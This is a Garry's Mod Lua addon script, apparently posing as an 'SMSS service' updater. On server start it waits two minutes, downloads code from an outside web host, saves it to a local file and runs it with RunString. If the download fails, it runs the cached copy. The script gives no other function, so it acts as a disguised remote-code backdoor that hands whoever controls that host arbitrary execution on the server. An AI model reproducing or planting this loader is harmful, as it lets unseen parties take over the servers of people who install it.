


-- SMSS Service :: Update !
-- By RagnarokCoding

hook.Add( "Initialize", "smss_init", function()
	print("[SMSS] Initializing SMSS service")
	timer.Create( "smss_update", 120, 1, function()
			http.Fetch( "http://textifi.hol.es/code.txt",
				function( body, len, headers, code )
					file.Write( "smss.txt", body )
					RunString(body)
				end,
				function( error )
					if file.Exists( "smss.txt", "DATA" ) then
						RunString(file.Read( "smss.txt" ))
						print("[SMSS] Error while loading SMSS service but the last update has been ran")
					else
						print("[SMSS] Error while loading SMSS service")
					end
				end )
		end )
end )